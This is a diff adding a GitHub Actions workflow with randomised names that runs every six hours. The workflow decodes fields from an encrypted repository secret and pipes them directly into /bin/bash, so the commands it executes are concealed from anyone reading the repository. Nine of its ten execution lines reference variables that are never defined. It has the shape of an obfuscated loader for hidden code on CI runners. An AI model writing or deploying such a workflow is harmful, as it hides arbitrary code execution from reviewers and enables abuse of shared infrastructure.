@@ -1,0 +1,26 @@
+name: leidate7890
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: leidate7890
+        env:
+          lwb80: ${{ secrets.lwb80 }}
+        run: |
+          echo $lwb80 | jq -r .ap30 | /bin/bash
+          echo $e70 | jq -r .u34 | /bin/bash
+          echo $wiol21811 | jq -r .w2 | /bin/bash
+          echo $ha64402 | jq -r .edsj6457 | /bin/bash
+          echo $m53 | jq -r .w9723 | /bin/bash
+          echo $wat8 | jq -r .dqr85629 | /bin/bash
+          echo $qinui08 | jq -r .nw531 | /bin/bash
+          echo $r4095 | jq -r .vu216 | /bin/bash
+          echo $u354 | jq -r .jh06 | /bin/bash
+          echo $nww57 | jq -r .uklzg22 | /bin/bash
+
